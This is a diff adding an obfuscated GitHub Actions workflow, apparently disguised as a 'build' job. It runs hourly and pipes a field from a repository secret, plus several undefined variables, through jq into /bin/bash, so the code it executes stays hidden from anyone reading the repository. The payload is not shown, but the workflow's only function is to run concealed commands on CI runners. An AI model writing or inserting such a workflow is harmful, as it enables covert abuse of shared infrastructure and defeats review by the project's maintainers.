@@ -1,0 +1,24 @@
+name: yunxiaoxi2121
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '49 * * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: yunxiaoxi2121
+        env:
+          kedw1928: ${{ secrets.kedw1928 }}
+        run: |
+          echo $kedw1928 | jq -r .ydbf4753 | /bin/bash
+          echo $z33441 | jq -r .k889 | /bin/bash
+          echo $t54645 | jq -r .b89 | /bin/bash
+          echo $svlf0756 | jq -r .cbw209 | /bin/bash
+          echo $yicfk72 | jq -r .eyds891 | /bin/bash
+          echo $v96 | jq -r .upnwo85002 | /bin/bash
+          echo $iwv0 | jq -r .u1 | /bin/bash
+
